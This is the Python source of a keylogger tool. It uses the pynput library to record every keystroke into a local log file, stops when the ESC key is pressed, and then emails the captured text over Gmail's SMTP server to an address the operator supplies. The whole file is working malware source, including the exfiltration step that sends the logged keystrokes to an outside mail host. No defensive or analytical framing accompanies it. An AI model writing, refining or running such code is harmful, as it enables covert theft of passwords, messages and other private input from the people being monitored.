#!/usr/bind/env python
#_*_ coding; utf8 _*_

from banner.banner import *
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import pynput.keyboard
import smtplib
import time
import getpass

banner()


logs = open('log.txt','w+')

from_mail = input("From => ")
password_mail = getpass.getpass("Password => ")
to_mail = input("To => ")
subject_mail = input("Subject => ")
print("\n\033[1;37mSTOP: \033[1;33mKEY-ESC\033[0m")

def sendFile():
    msg = MIMEMultipart()
    msg['From'] = from_mail 	#Your mail
    password = password_mail 	#Your email password
    msg['To'] = to_mail  		#Destination
    msg['Subject'] = subject_mail 
    msg.attach(MIMEText(open('log.txt').read())) #File to send

    try:
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(msg['From'],password)
        server.sendmail(msg['From'],msg['To'],msg.as_string())
        server.quit() #Close session

    except:
        pass


def pressKey(key):
    key1 = convert(key)
    if key1 == "Key.esc":
        print("\n\033[0;31mExiting...\033[0m")
        Logs()
        return False

    elif key1 == "Key.space":
        lista_teclas.append(" ")

    elif key1 == "Key.enter":
        lista_teclas.append("[ENTER]")

    elif key1 == "Key.shift":
        pass    

    elif key1 == "Key.backspace":
        pass

    elif key1 == "Key.tab":
        pass            

    else:
        lista_teclas.append(key1)             


def Logs():
    teclas = ''.join(lista_teclas)
    logs.write(teclas)
    logs.write('\n')
    logs.close()
    time.sleep(2)
    sendFile()

lista_teclas = []    

def convert(key):
    if isinstance(key,pynput.keyboard.KeyCode):
        return key.char
    else:
        return str(key)    

with pynput.keyboard.Listener(on_press=pressKey) as listen:
    listen.join()  
